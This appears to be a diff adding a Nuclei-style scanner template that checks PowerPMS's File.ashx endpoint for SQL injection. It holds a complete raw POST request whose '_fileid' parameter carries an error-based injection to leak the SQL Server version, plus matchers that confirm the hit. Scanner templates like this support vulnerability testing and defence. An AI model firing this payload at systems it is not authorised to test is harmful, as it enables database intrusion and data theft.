@@ -1,0 +1,35 @@
+id: powerpms-File-sqli
+info:
+  name: 普华Powerpms File.ashx SQL注入
+  author: leadlife
+  severity: high
+  description: 普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统File.ashx接口存在SQL注入漏洞，攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/qpxufz5g8700qwpx
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: powerpms,sqli
+
+http:
+  - raw:
+      - |
+        POST /PowerPlat/Control/File.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 111
+
+        NoCheckSession=true&ServerOperatorType=OpenRecord&_fileid='and+1<@@VERSION--&_type=ftp&action=topdf&sessionid=1
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Microsoft SQL Server')
+        condition: and
